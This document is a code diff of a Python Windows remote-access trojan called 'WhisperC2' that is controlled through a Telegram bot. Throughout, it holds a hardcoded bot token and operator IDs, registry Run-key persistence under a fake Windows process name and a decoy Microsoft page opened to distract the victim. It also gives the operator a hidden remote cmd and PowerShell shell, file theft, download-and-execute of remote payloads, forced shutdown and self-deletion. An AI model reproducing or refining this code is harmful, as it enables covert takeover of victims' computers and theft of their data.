@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # =============================================================================
-# WhisperC2 Professional – Production Ready (Reliable Shell)
+# WhisperC2 Professional – Final Production Build (Corrected)
 # =============================================================================
 import telebot, platform, subprocess, threading, time, os, sys, atexit, io, traceback, webbrowser
 import shutil, winreg, ctypes, requests
@@ -10,7 +10,7 @@ from urllib.parse import urlparse
 import random, string
 
 # -----------------------------------------------------------------------------
-# Configuration
+# Configuration – Zubby’s exact details
 # -----------------------------------------------------------------------------
 BOT_API_KEY = "8229959913:AAFuLnQB33pstSVbc-g0VgkuVFHHhTh4Qac"
 OPERATOR_CHAT_ID = 8269558111
@@ -18,7 +18,7 @@ GROUP_CHAT_ID = -1003919074770
 DECOY_URL = "https://learn.microsoft.com/en-us/dynamics365/supply-chain/procurement/purchase-order-overview"
 
 # -----------------------------------------------------------------------------
-# Mutex & Logging
+# Single‑instance mutex – proper cleanup
 # -----------------------------------------------------------------------------
 MUTEX_NAME = "Global\\WhisperPro_Mutex"
 mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
@@ -26,6 +26,9 @@ if ctypes.windll.kernel32.GetLastError() == 183:
     sys.exit(0)
 atexit.register(ctypes.windll.kernel32.CloseHandle, mutex)
 
+# -----------------------------------------------------------------------------
+# Thread‑safe log buffer
+# -----------------------------------------------------------------------------
 log_lock = threading.Lock()
 log_lines = []
 
@@ -36,46 +39,124 @@ def log(msg: str) -> None:
     print(f"* {msg}")
 
 # -----------------------------------------------------------------------------
-# Bot & Telemetry
+# HTML5 Telemetry
 # -----------------------------------------------------------------------------
 bot = telebot.TeleBot(BOT_API_KEY)
 
 def generate_telemetry_report(status: str) -> str:
     color = "#4CAF50" if status == "online" else "#F44336"
     emoji = "🟢" if status == "online" else "💀"
+    title = f"{SYSTEM_ID} – {status.upper()}"
+
     rows = ""
     with log_lock:
         for entry in log_lines[-30:]:
-            rows += f"<tr><td>{entry['time']}</td><td>{entry['msg']}</td></tr>"
+            rows += f"""
+                <tr>
+                    <td class="timestamp">{entry['time']}</td>
+                    <td class="message">{entry['msg']}</td>
+                </tr>"""
+
     html = f"""<!DOCTYPE html>
-<html><head><meta charset="UTF-8"><title>{SYSTEM_ID}</title>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>{title}</title>
 <style>
-    body {{background:#0d1117;color:#c9d1d9;font-family:Segoe UI;}}
-    .card {{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:20px;margin:20px auto;max-width:900px;}}
+    * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+    body {{
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background: linear-gradient(135deg, #0d1117, #161b22);
+        color: #c9d1d9;
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 2rem;
+    }}
+    .report-card {{
+        max-width: 900px;
+        width: 100%;
+        background: #161b22;
+        border: 1px solid #30363d;
+        border-radius: 16px;
+        overflow: hidden;
+        box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+    }}
+    .header {{
+        background: {color};
+        padding: 2rem;
+        text-align: center;
+    }}
+    .header h1 {{
+        font-size: 2rem;
+        font-weight: 600;
+        color: white;
+        margin-bottom: 0.25rem;
+    }}
+    .header .agent {{
+        font-size: 1rem;
+        opacity: 0.9;
+        color: white;
+        font-family: monospace;
+    }}
+    table {{
+        width: 100%;
+        border-collapse: collapse;
+    }}
+    th, td {{
+        padding: 0.75rem 1rem;
+        border-bottom: 1px solid #21262d;
+    }}
+    th {{
+        text-align: left;
+        background: #0d1117;
+        color: #8b949e;
+    }}
+    tr:hover {{
+        background: #1c2128;
+    }}
 </style>
-</head><body>
-<div class="card">
-    <h1>{emoji} {SYSTEM_ID} - {status.upper()}</h1>
-    <table>{rows or '<tr><td>No logs yet</td></tr>'}</table>
+</head>
+<body>
+<div class="report-card">
+    <div class="header">
+        <h1>{emoji} {title}</h1>
+        <div class="agent">{SYSTEM_ID}</div>
+    </div>
+    <div class="body" style="padding:1.5rem">
+        <table>
+            <thead><tr><th>Timestamp</th><th>Event</th></tr></thead>
+            <tbody>{rows if rows else '<tr><td colspan="2" style="text-align:center;color:#8b949e;">No log entries</td></tr>'}</tbody>
+        </table>
+    </div>
 </div>
-</body></html>"""
+</body>
+</html>"""
     return html
 
-def send_telemetry(topic_id, status: str):
-    if not topic_id: return
+def send_telemetry(topic_id, status: str) -> bool:
+    if not topic_id:
+        return False
+    html_content = generate_telemetry_report(status)
     try:
-        bio = io.BytesIO(generate_telemetry_report(status).encode())
+        bio = io.BytesIO(html_content.encode('utf-8'))
         bio.name = f"{SYSTEM_ID}_{status}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
         bot.send_document(GROUP_CHAT_ID, bio, message_thread_id=topic_id)
-    except:
+        log(f"Telemetry HTML report sent ({status})")
+        return True
+    except Exception as e:
+        print(f"Telemetry HTML failed: {e}")
+        plain = f"{'🟢' if status=='online' else '💀'} **{SYSTEM_ID}** {status}\n```\n" + "\n".join([x['msg'] for x in log_lines[-10:]]) + "\n```"
         try:
-            bot.send_message(GROUP_CHAT_ID, 
-                             f"{'🟢' if status=='online' else '💀'} **{SYSTEM_ID}** {status}", 
-                             message_thread_id=topic_id)
-        except: pass
+            bot.send_message(GROUP_CHAT_ID, plain, message_thread_id=topic_id, parse_mode='Markdown', timeout=10)
+            return True
+        except:
+            return False
 
 # -----------------------------------------------------------------------------
-# Agent Identity
+# Agent identity & persistence
 # -----------------------------------------------------------------------------
 appdata = os.environ.get('APPDATA', os.path.expanduser('~'))
 agents_dir = os.path.join(appdata, 'Microsoft', 'Windows')
@@ -92,77 +173,109 @@ HOSTNAME_PREFIX = SYSTEM_ID.split('/')[0]
 
 TOPIC_ID_FILE = Path(agents_dir) / "topic_id.txt"
 
-# -----------------------------------------------------------------------------
-# Shell Globals
-# -----------------------------------------------------------------------------
-shell_active = False
-shell_process = None
-_shell_topic_id = None
-shell_lock = threading.Lock()
-
-# -----------------------------------------------------------------------------
-# Persistence & Topic Management
-# -----------------------------------------------------------------------------
-def get_or_create_topic():
-    existing = None
+def load_topic_id() -> int | None:
     if TOPIC_ID_FILE.exists():
         try:
-            existing = int(TOPIC_ID_FILE.read_text().strip())
+            return int(TOPIC_ID_FILE.read_text().strip())
+        except:
+            pass
+    return None
+
+def save_topic_id(tid: int) -> None:
+    TOPIC_ID_FILE.write_text(str(tid))
+
+def get_or_create_topic() -> int | None:
+    existing = load_topic_id()
+    if existing:
+        try:
             test = bot.send_message(GROUP_CHAT_ID, "🔍", message_thread_id=existing)
             bot.delete_message(GROUP_CHAT_ID, test.message_id)
             return existing
         except:
             pass
     try:
-        new = bot.create_forum_topic(GROUP_CHAT_ID, SYSTEM_ID, icon_color=0x6FB9F0)
-        tid = new.message_thread_id
-        TOPIC_ID_FILE.write_text(str(tid))
+        new_topic = bot.create_forum_topic(GROUP_CHAT_ID, SYSTEM_ID, icon_color=0x6FB9F0)
+        tid = new_topic.message_thread_id
+        save_topic_id(tid)
         return tid
     except Exception as e:
         log(f"Topic creation failed: {e}")
         return None
 
-def install_persistence():
-    if not getattr(sys, 'frozen', False): 
+def install_persistence() -> bool:
+    if not getattr(sys, 'frozen', False):
         log("Persistence skipped – script mode")
         return False
     try:
-        dest = Path(agents_dir) / 'SystemSettingsBroker.exe'
-        curr = Path(sys.executable)
-        if curr.resolve() != dest.resolve() and not dest.exists():
-            shutil.copy2(curr, dest)
-        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
-            winreg.SetValueEx(key, "System Settings Broker", 0, winreg.REG_SZ, str(dest))
-        log("Persistence installed")
+        dest_path = Path(agents_dir) / 'SystemSettingsBroker.exe'
+        current = Path(sys.executable if getattr(sys, 'frozen', False) else __file__)
+        if current.resolve() == dest_path.resolve():
+            return True
+        if not dest_path.exists():
+            try:
+                shutil.copy2(current, dest_path)
+            except PermissionError:
+                log("Copy skipped – file exists or locked")
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                            r'Software\Microsoft\Windows\CurrentVersion\Run',
+                            0, winreg.KEY_SET_VALUE) as key:
+            winreg.SetValueEx(key, 'System Settings Broker', 0, winreg.REG_SZ, str(dest_path))
         return True
     except Exception as e:
-        log(f"Persistence failed: {e}")
+        log(f"Persistence error: {traceback.format_exc()}")
         return False
 
-def self_destruct(topic_id):
-    log("Self-destruct started")
+def self_destruct(topic_id) -> None:
+    log("Self‑destruct started")
     send_telemetry(topic_id, "offline")
     try:
-        (Path(agents_dir) / 'SystemSettingsBroker.exe').unlink(missing_ok=True)
-        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
-            winreg.DeleteValue(key, "System Settings Broker")
-    except: pass
+        persistent = Path(agents_dir) / 'SystemSettingsBroker.exe'
+        if persistent.exists():
+            persistent.unlink()
+    except Exception:
+        pass
     try:
-        ctypes.windll.kernel32.MoveFileExW(str(Path(sys.executable)), None, 0x4)
-    except: pass
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                            r'Software\Microsoft\Windows\CurrentVersion\Run',
+                            0, winreg.KEY_SET_VALUE) as key:
+            try:
+                winreg.DeleteValue(key, 'System Settings Broker')
+            except FileNotFoundError:
+                pass
+    except Exception:
+        pass
+    try:
+        # Safe path selection – frozen exe or script file
+        current = Path(sys.executable) if getattr(sys, 'frozen', False) else Path(__file__)
+        if current.exists():
+            ctypes.windll.kernel32.MoveFileExW(str(current), None, 0x4)
+    except Exception:
+        pass
 
 # -----------------------------------------------------------------------------
-# Interactive Shell
+# Interactive shell
 # -----------------------------------------------------------------------------
-def spawn_shell(topic_id):
+shell_active = False
+shell_process = None
+_shell_topic_id = None
+shell_lock = threading.Lock()
+
+def spawn_shell(topic_id) -> bool:
     global shell_active, shell_process, _shell_topic_id
     with shell_lock:
-        if shell_active: return True
+        if shell_active:
+            return True
         _shell_topic_id = topic_id
         try:
-            shell_process = subprocess.Popen("cmd.exe", 
-                stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                text=True, bufsize=0, creationflags=0x08000000)
+            shell_process = subprocess.Popen(
+                "cmd.exe",
+                stdin=subprocess.PIPE,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True,
+                bufsize=0,
+                creationflags=0x08000000
+            )
             shell_active = True
             threading.Thread(target=shell_reader, daemon=True).start()
             log("Interactive shell spawned")
@@ -171,33 +284,40 @@ def spawn_shell(topic_id):
             log(f"Shell spawn failed: {e}")
             return False
 
-def shell_reader():
+def shell_reader() -> None:
     global shell_active
     while shell_active and shell_process and shell_process.stdout:
-        if shell_process.poll() is not None: break
+        if shell_process.poll() is not None:
+            break
         try:
             line = shell_process.stdout.readline()
-            if not line: break
+            if not line:
+                break
             safe = line.replace('```', "'''")
             for chunk in [safe[i:i+3900] for i in range(0, len(safe), 3900)]:
                 try:
-                    bot.send_message(GROUP_CHAT_ID, f"```\n{chunk}\n```",
-                                   message_thread_id=_shell_topic_id, parse_mode='Markdown')
+                    bot.send_message(GROUP_CHAT_ID,
+                                     f"```\n{chunk}\n```",
+                                     message_thread_id=_shell_topic_id,
+                                     parse_mode='Markdown')
                     time.sleep(0.25)
-                except: pass
-        except: break
+                except:
+                    pass
+        except:
+            break
     kill_shell()
 
-def kill_shell():
+def kill_shell() -> None:
     global shell_active, shell_process
     shell_active = False
     if shell_process:
         try:
             shell_process.stdin.close()
             shell_process.terminate()
-        except: pass
+        except:
+            pass
 
-def write_shell(cmd: str):
+def write_shell(cmd: str) -> None:
     if shell_active and shell_process and shell_process.stdin:
         try:
             shell_process.stdin.write(cmd + "\n")
@@ -206,23 +326,29 @@ def write_shell(cmd: str):
             kill_shell()
 
 # -----------------------------------------------------------------------------
-# Command Helpers
+# Command helpers & dispatcher
 # -----------------------------------------------------------------------------
 def sys_cmd(cmd: str) -> str:
-    try: return subprocess.getstatusoutput(cmd)[1][:4000]
-    except Exception as e: return f"Error: {e}"
+    try:
+        return subprocess.getstatusoutput(cmd)[1][:4000]
+    except Exception as e:
+        return f"Error: {e}"
 
 def ps_cmd(cmd: str) -> str:
-    try: return subprocess.getstatusoutput(f"powershell -Command {cmd}")[1][:4000]
-    except Exception as e: return f"Error: {e}"
+    try:
+        return subprocess.getstatusoutput(f"powershell -Command {cmd}")[1][:4000]
+    except Exception as e:
+        return f"Error: {e}"
 
 def view_file(path: str) -> str:
     try:
         if not os.path.exists(path): return "Not found"
         if os.path.isdir(path): return "Is a directory"
         if os.path.getsize(path) > 10*1024*1024: return "Too large"
-        with open(path, 'r', errors='ignore') as f: return f.read()[:4000]
-    except Exception as e: return f"Error: {e}"
+        with open(path, 'r', errors='ignore') as f:
+            return f.read()[:4000]
+    except Exception as e:
+        return f"Error: {e}"
 
 def download_file_fs(path: str):
     try:
@@ -230,7 +356,8 @@ def download_file_fs(path: str):
         if os.path.isdir(path): return None, "Is a directory"
         if os.path.getsize(path) > 50*1024*1024: return None, "Too large"
         return path, None
-    except: return None, "Error"
+    except:
+        return None, "Error"
 
 def dex(arg_line: str):
     if not arg_line: return "Usage: dex <url> [args...]"
@@ -240,65 +367,62 @@ def dex(arg_line: str):
     p = urlparse(url)
     if p.scheme not in ('http','https'): return "Invalid scheme"
     ext = os.path.splitext(p.path)[1] or ".exe"
-    name = ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + ext
-    dest = os.path.join(os.environ.get('TEMP', '.'), name)
+    name = ''.join(random.choices(string.ascii_letters+string.digits, k=8)) + ext
+    dest = os.path.join(os.environ.get('TEMP','.'), name)
     try:
         r = requests.get(url, stream=True, timeout=30)
         r.raise_for_status()
         with open(dest, 'wb') as f:
-            for chunk in r.iter_content(8192):
-                if chunk: f.write(chunk)
-    except Exception as e: return f"Download failed: {e}"
+            for c in r.iter_content(8192):
+                if c: f.write(c)
+    except Exception as e:
+        return f"Download failed: {e}"
     try:
-        proc = subprocess.Popen([dest, *extra], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+        proc = subprocess.Popen([dest, *extra],
+                                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                 text=True, creationflags=0x08000000)
         out, err = proc.communicate(timeout=30)
         output = (out + err).strip() or "[No output]"
         return f"Executed: {dest}\nExit: {proc.returncode}\n{output}"
-    except Exception as e: return f"Execution error: {e}"
+    except Exception as e:
+        return f"Execution error: {e}"
     finally:
         try: ctypes.windll.kernel32.MoveFileExW(dest, None, 0x4)
         except: pass
 
-# -----------------------------------------------------------------------------
-# Command Dispatcher
-# -----------------------------------------------------------------------------
 def execute_command(cmd_line: str, topic_id):
     parts = cmd_line.strip().split(' ', 1)
     cmd = parts[0].lower()
     args = parts[1] if len(parts) > 1 else ""
 
-    if cmd in ("ping", "start", "scan"):
+    if cmd in ("ping","start","scan"):
         return f"🟢 {SYSTEM_ID} online\n{platform.system()} {platform.release()}", None
     elif cmd == "shell":
         if args: return sys_cmd(args).replace('```',"'''"), None
         return ("💬 Interactive shell started. Type `exit` to close.", None) if spawn_shell(topic_id) else ("❌ Failed to spawn shell.", None)
-    elif cmd in ("powershell", "pow"):
+    elif cmd in ("powershell","pow"):
         if not args: return "Usage: powershell <command>", None
         return ps_cmd(args).replace('```',"'''"), None
-    elif cmd in ("download", "downloadfile"):
+    elif cmd in ("download","downloadfile"):
         path, err = download_file_fs(args.strip())
         if err: return err, None
         return f"⬆️ Uploading {args.strip()}", path
     elif cmd == "delete":
-        try: 
-            os.remove(args.strip())
-            return f"🗑️ Deleted: {args.strip()}", None
+        try: os.remove(args.strip()); return f"🗑️ Deleted: {args.strip()}", None
         except Exception as e: return f"❌ Delete failed: {e}", None
-    elif cmd in ("view", "viewfile"):
-        return view_file(args.strip()).replace('```',"'''"), None
-    elif cmd == "dex":
-        return dex(args).replace('```',"'''"), None
+    elif cmd in ("view","viewfile"): return view_file(args.strip()).replace('```',"'''"), None
+    elif cmd == "dex": return dex(args).replace('```',"'''"), None
     elif cmd == "die":
         self_destruct(topic_id)
         return "💀 Shutting down...", None
     elif cmd == "off":
-        subprocess.run(["shutdown", "/s", "/t", "0", "/f"], check=False)
+        subprocess.run(["shutdown","/s","/t","0","/f"], check=False)
         return "🔌 Shutting down PC...", None
-    return f"❓ Unknown command: {cmd}", None
+    else:
+        return f"❓ Unknown: {cmd}", None
 
 # -----------------------------------------------------------------------------
-# Main Handler
+# Main
 # -----------------------------------------------------------------------------
 def main():
     log("Agent starting")
@@ -311,25 +435,24 @@ def main():
         time.sleep(2)
 
     if not topic_id:
-        log("Falling back to main group with prefix filter")
+        log("Could not create forum topic – falling back to main group (with hostname filter)")
         topic_id = None
 
-    log(f"Agent ready → {SYSTEM_ID} | Topic: {topic_id or 'MAIN (filtered)'}")
+    log(f"Agent ID: {SYSTEM_ID}, Topic: {topic_id if topic_id else 'main (filtered)'}")
 
-    def handler_wrapper(message):
+    def _handler_wrapper(message):
         if message.from_user.id != OPERATOR_CHAT_ID or message.from_user.is_bot:
             return
-
         if topic_id is not None:
             if getattr(message, 'message_thread_id', None) != topic_id:
                 return
-        elif not message.text or HOSTNAME_PREFIX not in message.text:
-            return
+        else:
+            if not message.text or HOSTNAME_PREFIX not in message.text:
+                return
 
         text = (message.text or "").strip()
         if not text: return
 
-        # Interactive Shell Mode
         if shell_active:
             clean = text[1:] if text.startswith('/') else text
             if clean.lower() == "exit":
@@ -342,13 +465,10 @@ def main():
                 write_shell(clean)
             return
 
-        # Normal Command Mode
-        if text.startswith('/'):
-            text = text[1:].strip()
-
+        if text.startswith('/'): text = text[1:]
         response, file_path = execute_command(text, topic_id)
-        reply_kwargs = {'message_thread_id': topic_id} if topic_id else {}
 
+        reply_kwargs = {'message_thread_id': topic_id} if topic_id else {}
         if text.lower().startswith("die"):
             bot.reply_to(message, f"```\n{response}\n```", parse_mode='Markdown', **reply_kwargs)
             sys.exit(0)
@@ -369,13 +489,12 @@ def main():
                 except: pass
 
     @bot.message_handler(chat_types=['supergroup'], func=lambda m: bool(m.text))
-    def handler(msg):
-        handler_wrapper(msg)
+    def _handler(msg):
+        _handler_wrapper(msg)
 
     threading.Thread(target=webbrowser.open, args=(DECOY_URL,), daemon=True).start()
     send_telemetry(topic_id, "online")
-
-    log("Polling started...")
+    log("Polling…")
     bot.infinity_polling(timeout=30, long_polling_timeout=30)
 
 if __name__ == "__main__":
